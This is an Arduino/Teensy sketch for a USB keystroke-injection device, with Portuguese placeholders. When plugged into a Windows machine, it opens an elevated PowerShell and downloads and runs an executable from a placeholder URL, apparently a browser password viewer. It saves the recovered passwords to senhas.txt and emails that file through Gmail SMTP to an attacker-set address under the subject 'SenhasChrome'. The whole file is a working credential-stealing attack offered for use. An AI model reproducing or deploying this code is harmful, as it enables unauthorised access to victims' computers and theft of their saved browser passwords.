/* thanks to Samy Kankar, and USB DriveBy!!

TradeCrafter - RJ - Brazil  */


const unsigned int ledPin = 13;
const unsigned int delayTime = 1500;
void setup()
{
  delay(1000);


  // Do the shit...
  pwn();

}

// Open an application on Windows via Run
void openapp(String app)
{
  // Windows Key + R to open Run
  key(KEY_R , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);

  // Type the App you want to open
  Keyboard.print(app);
  key(KEY_ENTER, 0);
  Keyboard.send_now();
  delay(delayTime);
}

void key(int KEY, int MODIFIER)
 {
  Keyboard.set_modifier(MODIFIER);
  Keyboard.set_key1(KEY);
  Keyboard.send_now();
  delay(20);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(20);
 }

void pwn()
{
  key(KEY_D , MODIFIERKEY_RIGHT_GUI);
  delay(delayTime);
  
  openapp("powershell Start-Process powershell -Verb runAs");
  delay(2000);  
  key(KEY_LEFT, 0);
  delay(500);
  key(KEY_ENTER, 0);
  delay(1000);
  Keyboard.println("$down = New-Object System.Net.WebClient; $url = 'sua-URL.exe'; $file = 'WBPV.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
  key(KEY_ENTER, 0);
  delay(15000);
  key(KEY_A, MODIFIERKEY_LEFT_CTRL);
  delay(100);
  key(KEY_S, MODIFIERKEY_LEFT_CTRL);
  delay(500);
  Keyboard.print("senhas.txt");
  delay(200);
  key(KEY_ENTER, 0);
  delay(100);
  
 openapp("powershell");
 delay(1000);
 Keyboard.println("$SMTPServer = 'smtp.gmail.com'");
 Keyboard.println("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
 Keyboard.println("$SMTPInfo.EnableSsl = $true"); 
 Keyboard.println("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('seue-mail@gmail.com', 'sua-senha')");
 Keyboard.println("$ReportEmail = New-Object System.Net.Mail.MailMessage");
 Keyboard.println("$ReportEmail.From = 'seu-email@gmail.com'"); 
 Keyboard.println("$ReportEmail.To.Add('recebe-email@gmail.com')");
 Keyboard.println("$ReportEmail.Subject = 'SenhasChrome'");
 Keyboard.println("$ReportEmail.Body = (Get-Content documents/senhas.txt | out-string)");
 Keyboard.println("$SMTPInfo.Send($ReportEmail)");
 delay(6000);
 Keyboard.println("exit");
 key(KEY_F4, MODIFIERKEY_LEFT_ALT);
 delay(100);
 key(KEY_F4, MODIFIERKEY_LEFT_ALT);
 delay(100);
 key(KEY_F4, MODIFIERKEY_LEFT_ALT);
 delay(100);
}

void loop()
{
  // Blink -> IT'S DONE
  digitalWrite(ledPin, HIGH);
  delay(80);
  digitalWrite(ledPin, LOW);
  delay(80);
}
